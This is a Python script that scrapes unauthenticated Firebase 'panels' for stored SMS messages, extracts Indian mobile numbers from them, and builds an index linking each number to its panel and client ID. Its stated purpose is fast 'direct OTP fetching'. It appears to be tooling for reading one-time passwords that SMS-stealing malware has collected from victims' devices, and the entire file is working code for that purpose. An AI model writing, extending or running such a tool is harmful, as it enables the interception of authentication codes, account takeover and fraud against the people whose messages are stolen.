#!/usr/bin/env python3
"""
Builds device_index.json mapping every mobile number to its exact (panel_url, client_id) pair.
This enables 50ms ultra-fast direct OTP fetching.
"""

import sys
import os
import re
import json
import requests
import base64
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8")
        sys.stderr.reconfigure(encoding="utf-8")
    except Exception:
        pass

PANELS_FILE = "panels.txt"
DEVICE_INDEX_FILE = "device_index.json"

def parse_firebase_link(link: str):
    if not link:
        return None
    link = link.strip()
    if not link.startswith(("http://", "https://")):
        link = "https://" + link

    parsed = urlparse(link)
    qs = parse_qs(parsed.query)
    encoded_s = qs.get("s", [None])[0]
    if encoded_s:
        try:
            encoded_clean = encoded_s + "=" * (-len(encoded_s) % 4)
            decoded = base64.b64decode(encoded_clean).decode("utf-8", errors="ignore").split("|")[0].strip()
            if "firebaseio.com" in decoded or "firebasedatabase.app" in decoded:
                if not decoded.startswith(("http://", "https://")):
                    decoded = "https://" + decoded
                return decoded.rstrip("/") + "/"
        except Exception:
            pass

    if "firebaseio.com" in link or "firebasedatabase.app" in link:
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        return base_url.rstrip("/") + "/"

    return None

def main():
    panel_urls = []
    if os.path.exists(PANELS_FILE):
        with open(PANELS_FILE, "r", encoding="utf-8") as f:
            for line in f:
                p = parse_firebase_link(line)
                if p:
                    panel_urls.append(p)

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Accept": "application/json"
    }

    def scan_panel(panel_url):
        device_map = {}
        try:
            url = panel_url.rstrip("/") + "/messages.json"
            resp = requests.get(url, headers=headers, timeout=8)
            if resp.status_code == 200:
                data = resp.json() or {}
                if isinstance(data, dict):
                    for client_id, device_msgs in data.items():
                        if not isinstance(device_msgs, dict):
                            continue
                        for m in device_msgs.values():
                            if isinstance(m, dict):
                                t = str(m.get("body") or m.get("message") or m.get("text") or "")
                                phone_match = re.search(r"\b([6-9]\d{9})\b", t)
                                if phone_match:
                                    phone = phone_match.group(1)
                                    device_map[phone] = {
                                        "panel_url": panel_url,
                                        "client_id": client_id
                                    }
        except Exception:
            pass
        return device_map

    print("=" * 70)
    print(f"🔄 Building Device Index (Phone -> Panel URL + Client ID)")
    print("=" * 70)
    print(f"Scanning {len(panel_urls)} Firebase panels...")

    master_index = {}
    with ThreadPoolExecutor(max_workers=25) as executor:
        futures = [executor.submit(scan_panel, u) for u in panel_urls]
        for f in as_completed(futures):
            master_index.update(f.result())

    print(f"\n✅ Successfully indexed {len(master_index)} mobile numbers to their exact (Panel URL, Client ID) pairs!")

    with open(DEVICE_INDEX_FILE, "w", encoding="utf-8") as f:
        json.dump(master_index, f, indent=2)

    print(f"📄 Device index saved to: {DEVICE_INDEX_FILE}")

if __name__ == "__main__":
    main()
